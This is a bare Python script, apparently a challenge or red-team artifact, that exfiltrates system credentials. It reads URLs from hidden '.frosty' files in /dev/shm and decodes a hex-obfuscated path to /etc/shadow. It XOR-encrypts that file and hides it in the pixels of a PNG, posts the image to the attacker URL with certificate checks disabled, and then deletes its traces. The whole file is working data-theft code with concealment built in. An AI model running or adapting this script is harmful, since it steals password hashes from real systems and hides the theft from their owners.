#!/usr/local/bin/python3
from PIL import Image
import math
import os
import re
import subprocess
import requests
import random

cmd = "ls -la /dev/shm/ | grep -E '\\.frosty[0-9]+$' | awk -F \" \" '{print $9}'"
files = subprocess.check_output(cmd, shell=True).decode().strip().split('\n')

BLOCK_SIZE = 6
random_key = bytes([random.randrange(0, 256) for _ in range(0, BLOCK_SIZE)])
def boxCrypto(block_size, block_count, pt, key):
    currKey = key
    tmp_arr = bytearray()
    for i in range(block_count):
        currKey = crypt_block(pt[i*block_size:(i*block_size)+block_size], currKey, block_size)
        tmp_arr += currKey
    return tmp_arr.hex()

def crypt_block(block, key, block_size):
    retval = bytearray()
    for i in range(0,block_size):
        retval.append(block[i] ^ key[i])
    return bytes(retval)

def create_hex_image(input_file, output_file="hex_image.png"):
    with open(input_file, 'rb') as f:
        data = f.read()

    pt = data + (BLOCK_SIZE - (len(data) % BLOCK_SIZE)) * b'\x00'
    block_count = int(len(pt) / BLOCK_SIZE)
    enc_data = boxCrypto(BLOCK_SIZE, block_count, pt, random_key)
    enc_data = bytes.fromhex(enc_data)

    file_size = len(enc_data)
    width = int(math.sqrt(file_size))
    height = math.ceil(file_size / width)
    
    img = Image.new('RGB', (width, height), color=(0, 0, 0))
    pixels = img.load()

    for i, byte in enumerate(enc_data):
        x = i % width
        y = i // width
        if y < height:
            pixels[x, y] = (0, 0, byte)

    img.save(output_file)
    print(f"Image created: {output_file}")

for file in files:
    if not file:
        continue
    
    with open(f"/dev/shm/{file}", 'r') as f:
        addr = f.read().strip()

    if re.match(r'^https?://[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', addr):
        exfil_file = b'\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77'.decode()
        
        if os.path.isfile(exfil_file):
            
            try:
                create_hex_image(exfil_file, output_file="/dev/shm/.tmp.png")
                data = bytearray()
                with open(f"/dev/shm/.tmp.png", 'rb') as f:
                    data = f.read()
                os.remove("/dev/shm/.tmp.png")
                requests.post(
                    url=addr, 
                    data={"secret_file": data}, 
                    timeout=10, 
                    verify=False
                )
            except requests.exceptions.RequestException:
                pass
    else:
        print(f"Invalid URL format: {addr} - request ignored")
    
    # Remove the file
    os.remove(f"/dev/shm/{file}")
